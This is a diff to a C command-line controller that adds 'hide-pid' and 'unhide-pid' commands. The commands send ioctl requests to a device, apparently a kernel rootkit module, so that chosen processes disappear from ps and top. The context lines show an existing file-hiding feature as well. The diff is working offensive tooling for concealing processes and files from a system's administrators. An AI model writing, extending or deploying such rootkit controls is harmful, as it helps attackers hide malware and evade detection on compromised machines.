@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <string.h>
+#include <stdlib.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>
@@ -63,6 +64,58 @@ int main(int argc, char *argv[])
             printf("File '%s' is now visible\n", argv[2]);
         }
 
+    } else if (strcmp(argv[1], "hide-pid") == 0) {
+        if (argc < 3) {
+            fprintf(stderr, "Error: PID required\n");
+            close(fd);
+            return 1;
+        }
+        // validation
+        long pid = strtol(argv[2], NULL, 10);
+        if (pid <= 0) {
+            fprintf(stderr, "Error: invalid PID '%s'\n", argv[2]);
+            close(fd);
+            return 1;
+        }
+
+        memset(buf, 0, sizeof(buf));
+        snprintf(buf, sizeof(buf), "%ld", pid);
+
+        ret = ioctl(fd, IOCTL_HIDE_PID, buf);
+        if (ret < 0) {
+            if (errno == EEXIST)
+                fprintf(stderr, "PID %s is already hidden\n", argv[2]);
+            else
+                perror("ioctl HIDE_PID failed");
+        } else {
+            printf("PID %s is now hidden from ps/top\n", argv[2]);
+        }
+
+    } else if (strcmp(argv[1], "unhide-pid") == 0) {
+        if (argc < 3) {
+            fprintf(stderr, "Error: PID required\n");
+            close(fd);
+            return 1;
+        }
+        long pid = strtol(argv[2], NULL, 10);
+        if (pid <= 0) {
+            fprintf(stderr, "Error: invalid PID '%s'\n", argv[2]);
+            close(fd);
+            return 1;
+        }
+        memset(buf, 0, sizeof(buf));
+        snprintf(buf, sizeof(buf), "%ld", pid);
+
+        ret = ioctl(fd, IOCTL_UNHIDE_PID, buf);
+        if (ret < 0) {
+            if (errno == ENOENT)
+                fprintf(stderr, "PID %s is not in the hidden list\n", argv[2]);
+            else
+                perror("ioctl UNHIDE_PID failed");
+        } else {
+            printf("PID %s is now visible\n", argv[2]);
+        }
+        
     } else {
         fprintf(stderr, "Unknown command: %s\n", argv[1]);
         close(fd);
